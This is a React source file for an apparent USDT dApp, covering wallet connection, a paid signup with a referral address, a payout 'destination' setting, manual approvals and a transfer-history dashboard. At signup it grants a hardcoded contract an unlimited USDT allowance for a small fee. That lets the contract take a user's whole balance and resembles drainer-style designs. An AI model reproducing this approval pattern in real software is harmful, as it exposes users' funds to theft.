import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESS, USDT_ADDRESS, CONTRACT_ABI, USDT_ABI } from './constants';

function App() {
  const [account, setAccount] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [destination, setDestination] = useState("");
  const [inputDest, setInputDest] = useState("");
  const [referralInput, setReferralInput] = useState(""); // NEW: Referral state
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [signupFee, setSignupFee] = useState("1.00");
  const [refBonus, setRefBonus] = useState("0.00"); // NEW: Referral Bonus state

  // Contract Address Updated
  const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const address = await signer.getAddress();
        setAccount(address);
        checkRegistration(address, provider);
        
        const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
        const fee = await contract.signupFee();
        setSignupFee(ethers.formatUnits(fee, 18));
      } catch (error) {
        console.error("Connection failed", error);
      }
    } else {
      alert("Please install Metamask!");
    }
  };

  const checkRegistration = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const data = await contract.getUserDashboardData(userAddress);
      setIsRegistered(data.isReg);
      setDestination(data.dest);
      if (data.isReg) fetchHistory(userAddress, provider);
    } catch (error) {
      console.error("Error checking registration", error);
    }
  };

  // 3. Updated Sign Up with Referral
  const handleSignUp = async () => {
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
      await approveTx.wait();

      // Referral logic: agar khali hai to address(0) bhejenge
      const ref = referralInput && ethers.isAddress(referralInput) ? referralInput : "0x0000000000000000000000000000000000000000";
      
      const regTx = await coreContract.register(ref);
      await regTx.wait();

      alert("Registration Successful!");
      setIsRegistered(true);
    } catch (error) {
      console.error("Signup Failed", error);
      alert("Signup Failed! Check console.");
    }
    setLoading(false);
  };

  // 4. Set Destination (Unchanged logic)
  const handleSetDestination = async () => {
    if (!inputDest) return alert("Enter an address!");
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      const tx = await contract.setDestination(inputDest);
      await tx.wait();
      setDestination(inputDest);
      alert("Destination Saved!");
    } catch (error) {
      alert("Failed!");
    }
    setLoading(false);
  };

  // 5. Approve (Unchanged)
  const handleManualApprove = async () => {
    const amountToApprove = prompt("Approve USDT amount:", "10");
    if (!amountToApprove) return;
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const tx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.parseUnits(amountToApprove, 18));
      await tx.wait();
      alert("Approved!");
    } catch (error) { alert("Failed"); }
    setLoading(false);
  };

  const fetchHistory = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    const hist = await contract.getUserTransferHistory(userAddress);
    setHistory(hist);
  };

  const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-[#05020a]">
      {/* ... (UI Structure same rakha hai) ... */}
      {!account ? (
         <button onClick={connectWallet} className="w-full bg-gradient-to-r from-[#9333ea] to-[#db2777] text-white p-4 rounded-2xl">Connect Wallet</button>
      ) : !isRegistered ? (
        <div className="py-2">
            <h2 className="text-white text-center text-2xl font-bold mb-4">Sign Up</h2>
            {/* NEW: Referral Input */}
            <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] text-white p-4 rounded-2xl mb-4 border border-purple-500/30" />
            <button onClick={handleSignUp} className="w-full bg-gradient-to-r from-[#9333ea] to-[#db2777] text-white p-4 rounded-2xl">Sign Up</button>
        </div>
      ) : (
        <div className="py-2">
            <h2 className="text-white text-xl font-bold mb-4">Dashboard</h2>
            {/* NEW: Referral Bonus Display */}
            <div className="bg-[#1a103c] p-4 rounded-xl border border-purple-500 mb-4 text-center">
                <p className="text-purple-300 text-sm">Referral Bonus Earned</p>
                <p className="text-green-400 font-bold text-lg">{refBonus} USDT</p>
            </div>
            {/* ... rest of your original dashboard UI (Save Destination, Approve, History) ... */}
        </div>
      )}
    </div>
  );
}
export default App;